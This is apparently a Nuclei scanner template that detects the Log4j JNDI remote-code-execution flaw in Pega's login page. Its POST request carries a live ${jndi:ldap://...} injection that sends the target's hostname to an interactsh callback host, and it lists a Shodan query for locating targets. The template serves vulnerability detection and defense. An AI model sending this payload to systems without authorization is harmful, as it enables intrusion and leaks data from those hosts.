http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - internal: true
    kval:
    - location
    name: location
    part: header_1
    type: kval
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET /prweb/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'POST {{location}} HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Referer: {{location}}

    Content-Type: application/x-www-form-urlencoded


    pzAuth=guest&UserIdentifier=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&Password=a&pyActivity%3DCode-Security.Login=&lockScreenID=&lockScreenPassword=&newPassword=&confirmNewPassword=

    '
id: pega-log4j-rce
info:
  author: shaikhyaser
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Pega is susceptible to Log4j JNDI remote code execution. Pega provides
    a powerful low-code platform that empowers the world''s leading enterprises to
    Build for Change.

    '
  metadata:
    max-request: 2
    shodan-query: title:"Pega"
  name: Pega - Remote Code Execution (Apache Log4j)
  reference:
  - https://docs.pega.com/security-advisory/security-advisory-apache-log4j-zero-day-vulnerability
  severity: critical
  tags: cve,cve2021,rce,jndi,log4j,pega,oast,kev
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
  str: '{{rand_base(5)}}'
